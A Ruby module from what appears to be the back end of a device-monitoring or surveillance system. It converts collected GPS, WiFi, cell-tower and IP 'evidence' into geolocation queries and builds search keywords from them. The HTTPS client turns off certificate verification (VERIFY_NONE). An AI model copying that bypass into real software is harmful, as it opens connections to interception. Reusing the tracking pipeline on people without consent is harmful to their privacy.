require_relative 'single_evidence'

module RCS
  module PositionProcessing
    extend SingleEvidence
    include EventMachine::Protocols
    include RCS::Tracer

    def process
      case self[:data][:type]
        when 'GPS'
          q = {map: {location: {latitude: self[:data][:latitude], longitude: self[:data][:longitude]}}}
        when 'WIFI'
          towers = []
          self[:data][:wifi].each do |wifi|
            towers << {mac_address: wifi[:mac], signal_strength: wifi[:sig], ssid: wifi[:bssid]}
          end
          q = {map: {wifi_towers: towers}}
        when 'GSM'
          q = {map: {cell_towers: [
              {mobile_country_code: self[:data][:cell][:mcc], mobile_network_code: self[:data][:cell][:mnc], location_area_code: self[:data][:cell][:lac], cell_id: self[:data][:cell][:cid], signal_strength: self[:data][:cell][:db], timing_advance: self[:data][:cell][:adv], age: self[:data][:cell][:age]}
          ], radio_type: 'gsm'}}
        when 'CDMA'
          q = {map: {cell_towers: [
              {mobile_country_code: self[:data][:cell][:mcc], mobile_network_code: self[:data][:cell][:sid], location_area_code: self[:data][:cell][:nid], cell_id: self[:data][:cell][:bid], signal_strength: self[:data][:cell][:db], timing_advance: self[:data][:cell][:adv], age: self[:data][:cell][:age]}
          ], radio_type: 'cdma'}}
        when 'IPv4'
          q = {map: {ip_address: {ipv4: self[:data][:ip]}}}
      end

      http = Net::HTTP.new(RCS::DB::Config.instance.global['CN'], RCS::DB::Config.instance.global['LISTENING_PORT'])
      http.use_ssl = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE

      res = http.request_post('/position', q.to_json)
      reply = JSON.parse(res.body)

      return if reply['latitude'].nil? or reply['longitude'].nil?

      self[:data]['accuracy'] = 20 if self[:data][:type] == 'GPS'
      self[:data].merge!(reply)
    end

    def keyword_index
      self[:kw] = []

      puts self[:data].inspect

      self[:kw] += self[:data]['latitude'].to_s.keywords unless self[:data]['latitude'].nil?
      self[:kw] += self[:data]['longitude'].to_s.keywords unless self[:data]['longitude'].nil?

      unless self[:data]['address'].nil?
        self[:data]['address'].each_value do |add|
          self[:kw] += add.keywords
        end
      end
      unless self[:data][:cell].nil?
        self[:data][:cell].each_value do |cell|
          self[:kw] << cell.to_s
        end
      end
      unless self[:data][:wifi].nil?
        self[:data][:wifi].each do |wifi|
          self[:kw] += [wifi[:mac].keywords, wifi[:bssid].keywords ].flatten
        end
      end

      self[:data].each_value do |value|
        next unless value.is_a? String
        self[:kw] += value.keywords
      end

      self[:kw].uniq!

      puts self[:kw].inspect

    end

    def type
      :position
    end
  end # PositionProcessing
end # DB
